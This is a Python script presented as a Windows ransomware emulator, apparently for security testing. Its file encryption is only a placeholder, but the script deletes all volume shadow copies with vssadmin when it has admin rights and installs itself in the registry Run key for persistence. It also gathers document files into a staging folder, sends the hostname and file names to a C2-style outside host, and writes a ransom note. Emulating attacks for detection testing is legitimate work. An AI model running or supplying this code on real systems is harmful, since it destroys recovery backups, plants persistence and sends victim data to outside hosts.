# ransomware_emulator.py (FINAL - Packaging-Friendly Version)

import os
import time
import random
import string
import winreg
import subprocess
import requests
import ctypes
import sys
import shutil

# --- Configuration ---
C2_SERVER_URL = "http://ransomware-c2-server-91k2d.com"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

def is_admin():
    """Checks for administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def generate_random_extension(length=4):
    letters_and_digits = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def delete_shadow_copies():
    if not is_admin():
        print("[-] Skipping shadow copy deletion (requires admin rights).")
        return
    print("\n[+] Attempting to delete shadow copies...")
    try:
        command = "vssadmin.exe delete shadows /all /quiet"
        subprocess.run(command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] SUCCESS: Shadow copy deletion command executed.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[-] FAILED: Could not execute shadow copy deletion.")

def create_persistence(script_path, key_name):
    print("[+] Attempting to create persistence mechanism...")
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry_key)
        print(f"[+] Successfully created startup registry key: '{key_name}'")
    except Exception as e:
        print(f"[!] Failed to create persistence. Error: {e}")

def create_dummy_files():
    print("[+] Creating dummy files...")
    files_to_create = {"report_Q4.docx": "confidential data", "budget_2025.xlsx": "financials", "meeting_notes.txt": "secret plans"}
    for filename, content in files_to_create.items():
        with open(filename, "w") as f:
            f.write(content)
    print("[+] Dummy files created.")

def emulate_encryption(encrypted_extension):
    print(f"\n[+] Starting encryption with random extension: {encrypted_extension}")
    # ... (Encryption logic here)
    print("[+] File encryption emulation complete.")

def simulate_c2_checkin(ransom_id):
    print(f"\n[+] Simulating C2 check-in to: {C2_SERVER_URL}/checkin")
    try:
        victim_data = {'id': ransom_id, 'hostname': os.environ.get('COMPUTERNAME', 'unknown'), 'status': 'infection_started'}
        requests.post(f"{C2_SERVER_URL}/checkin", json=victim_data, timeout=2)
    except requests.exceptions.RequestException:
        print("[-] C2 check-in failed (as expected).")

def find_sensitive_files(search_path='.'):
    print(f"\n[+] Searching for sensitive files in {os.path.abspath(search_path)}...")
    sensitive_extensions = ('.docx', '.xlsx', '.pdf', '.txt')
    found_files = []
    for root, _, files in os.walk(search_path):
        for file in files:
            if file.endswith(sensitive_extensions) and "DECRYPT_INSTRUCTIONS" not in file:
                found_files.append(os.path.join(root, file))
    print(f"[+] Found {len(found_files)} sensitive files.")
    return found_files

def stage_files_for_exfiltration(file_list, ransom_id):
    staging_dir = os.path.join(os.environ['TEMP'], f"stage_{ransom_id}")
    print(f"[+] Staging files in a temporary directory: {staging_dir}")
    try:
        os.makedirs(staging_dir, exist_ok=True)
        for file_path in file_list:
            shutil.copy(file_path, staging_dir)
        print("[+] File staging complete.")
        return staging_dir
    except Exception as e:
        print(f"[-] Failed to stage files. Error: {e}")
        return None

def simulate_data_exfiltration(staging_dir, ransom_id):
    print(f"[+] Simulating exfiltration of data from {staging_dir}...")
    try:
        staged_files = os.listdir(staging_dir)
        exfil_data = {'id': ransom_id, 'exfiltrated_files': staged_files}
        requests.post(f"{C2_SERVER_URL}/upload", json=exfil_data, timeout=3)
    except requests.exceptions.RequestException:
        print("[-] Data exfiltration upload failed (as expected).")

def main():
    print("--- Ransomware Emulator (Packaged Version) ---")
    if is_admin():
        print("[+] Running with ADMIN privileges.")
    else:
        print("[-] Running with STANDARD user privileges.")

    RANSOM_ID = generate_random_extension()
    
    # --- The FULL Attack Sequence ---
    simulate_c2_checkin(RANSOM_ID)
    create_dummy_files()
    sensitive_files = find_sensitive_files()
    staging_directory = stage_files_for_exfiltration(sensitive_files, RANSOM_ID)
    
    if staging_directory:
        simulate_data_exfiltration(staging_directory, RANSOM_ID)
        shutil.rmtree(staging_directory)
        print("[+] Staging directory cleaned up.")

    create_persistence(os.path.abspath(sys.argv[0]), "SysSvc_" + RANSOM_ID)
    delete_shadow_copies()
    emulate_encryption("." + RANSOM_ID)
    
    with open(f"DECRYPT_INSTRUCTIONS_{RANSOM_ID}.txt", "w") as f:
        f.write(f"Your files are encrypted. Your recovery ID is: {RANSOM_ID}")
    print(f"[+] Ransom note created.")

    print("\n--- Simulation Finished ---")
    input("Press Enter to exit...")


if __name__ == "__main__":
    # The script now runs directly without the re-launch logic.
    main()